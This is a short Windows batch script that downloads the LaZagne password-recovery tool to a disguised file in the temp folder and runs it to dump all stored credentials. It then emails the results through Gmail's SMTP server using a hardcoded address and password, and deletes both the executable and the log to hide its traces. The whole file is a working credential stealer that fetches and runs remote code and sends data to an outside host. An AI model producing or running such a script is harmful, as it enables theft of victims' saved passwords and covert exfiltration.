
@echo off

set downloadURL=https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.2/lazagne.exe
set email=dashdashpass7@gmail.com
set password=7.gmukhlis

set exeFile=%TEMP%\proc.exe
set logFile=%TEMP%\proclog.txt
set arguments=all


powershell (new-object System.Net.WebClient).DownloadFile('%downloadURL%','%exeFile%');
%exeFile% %arguments% > %logFile%

del %exeFile%

powershell $SMTPServer = 'smtp.gmail.com';$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587);$SMTPInfo.EnableSsl = $true;$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('%email%', '%password%');$ReportEmail = New-Object System.Net.Mail.MailMessage;$ReportEmail.From = '%email%';$ReportEmail.To.Add('%email%');$ReportEmail.Subject = 'Lazagne Report';$ReportEmail.Body = 'Lazagne report in the attachments.';$ReportEmail.Attachments.Add('%logFile%');$SMTPInfo.Send($ReportEmail);

del %logFile%
